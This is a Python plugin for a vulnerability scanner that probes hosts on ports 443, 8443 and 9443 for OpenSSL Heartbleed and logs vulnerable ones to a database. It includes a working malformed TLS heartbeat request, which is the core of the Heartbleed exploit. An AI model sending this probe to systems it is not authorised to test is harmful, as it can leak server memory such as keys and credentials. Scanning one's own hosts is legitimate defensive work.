#!/usr/bin/python
#-*- coding:utf-8 -*-

'''openssl heartbleed'''

import struct
import socket
import time
import select
from Plugins.iPluginBase import PluginBase
from common.threadpool import ThreadPool
from common.util import getCurTime
from config.db_settings import SYSVUL_TABLE
from config.logger import logger

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		return None, None, None
	return typ, ver, pay

def hit_hb(s):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			return False

		if typ == 24:
			return True

		if typ == 21:
			return False


__all__ = ['OpensslPlugin']

class OpensslPlugin(PluginBase):

	name = "OpensslPlugin"
	version = '1.0'
	description = 'openssl heartbleed'

	def __init__(self):
		PluginBase.__init__(self)
		self.threadpool = ThreadPool(num_of_threads= 10 , num_of_work= 10 , daemon = True)
		self.service = 'openssl'
		self.port_list = ['443', '8443', '9443']

	def execute_run(self, ip, port, taskid):
		if str(port) in self.port_list:
			logger.info('[Openssl] ip:%s, port:%s' % (str(ip), str(port)))
			self.threadpool.add_job(self.__test_heartbleed, ip, port)
			self.async_deal_into_db(taskid)

	def __test_heartbleed(self, *args, **kwargs):
		'''
		:param args:
		:param kwargs:
		:return:
		'''
		(ip, port) = args[0]
		bvulnerable = False
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, int(port)))
			s.send(hello)
			while True:
				typ, ver, pay = recvmsg(s)
				if typ == None:
					s.close()
				if typ == 22 and ord(pay[0]) == 0x0E:
					break
			s.send(hb)
			if hit_hb(s):
				bvulnerable = True
			s.close()
		except:
			pass
		return {'ip':ip, 'port': port, 'status':bvulnerable}

	def async_deal_into_db(self, taskid):
		while not self.threadpool.resultQueue.empty():
			try:
				result_dit = self.threadpool.resultQueue.get_nowait()
				if result_dit['status']:
					sysvul_dic = {}
					sysvul_dic['sid'] = taskid
					sysvul_dic['ip']  = result_dit['ip']
					sysvul_dic['port'] = result_dit['port']
					sysvul_dic['service'] = self.service
					sysvul_dic['first_time'] = getCurTime()
					self.plugin_db.insert_by_dict(SYSVUL_TABLE, sysvul_dic)
			except:
				break

	def wait_for_complete(self, taskid):
		#PluginBase.wait_for_complete(self)
		self.async_deal_into_db(taskid)
		self.db_close()